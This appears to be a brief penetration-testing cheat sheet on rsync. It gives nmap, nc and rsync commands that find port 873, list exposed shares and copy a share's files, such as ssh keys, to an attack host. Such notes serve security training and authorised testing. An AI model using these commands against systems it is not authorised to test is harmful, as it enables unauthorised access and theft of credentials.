% PEN - rsync

# 1. Scanning for Rsync - port 873 by default
sudo nmap -sV -p 873 127.0.0.1

# 2. Probing for Accessible Shares (to see what we can gain access to)
nc -nv 127.0.0.1 873

# 3. Enumerating an Open Sharea - if we see a share called dev, and we can enumerate it further
rsync -av --list-only rsync://127.0.0.1/dev
# If we see output of files that may be worth pulling down for investigation, (like ssh keys), we can sync all files to our attack host with the command
rsync -av rsync://127.0.0.1/dev
